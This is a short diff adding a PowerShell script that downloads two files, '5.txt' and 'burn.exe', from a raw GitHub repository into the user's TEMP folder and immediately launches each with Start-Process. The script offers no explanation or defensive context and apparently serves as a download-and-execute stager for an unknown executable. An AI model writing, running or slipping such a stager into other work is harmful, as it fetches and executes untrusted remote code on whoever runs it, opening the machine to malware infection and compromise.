@@ -1,0 +1,7 @@
+iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/5.txt -OutFile $env:TEMP\5.txt
+
+Start-Process $env:TEMP\5.txt
+
+iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/burn.exe -OutFile $env:TEMP\burn.exe
+
+Start-Process $env:TEMP\burn.exe
